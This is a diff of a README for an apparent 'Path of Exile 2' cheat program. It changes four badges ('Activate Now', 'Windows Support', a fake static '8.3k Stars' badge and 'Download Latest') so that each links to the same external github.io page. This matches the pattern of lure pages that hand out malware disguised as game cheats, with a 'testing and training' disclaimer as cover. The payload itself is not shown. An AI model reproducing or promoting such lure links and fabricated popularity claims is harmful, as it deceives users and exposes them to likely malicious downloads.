@@ -11,10 +11,10 @@ Path of Exile 2 offers a complex world of loot, enemies, and strategy. This chea
 \[!WARNING]
 This software is intended for **testing, analysis, and training**. Use responsibly and back up your data.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 8.3k Stars](https://img.shields.io/badge/⭐️%208.3k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://poe-2-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://poe-2-cheat.github.io/.github/)
+[![⭐️ 8.3k Stars](https://img.shields.io/badge/⭐️%208.3k-Stars-yellow?style=for-the-badge\&logo=github)](https://poe-2-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://poe-2-cheat.github.io/.github/)
 
 ---
 
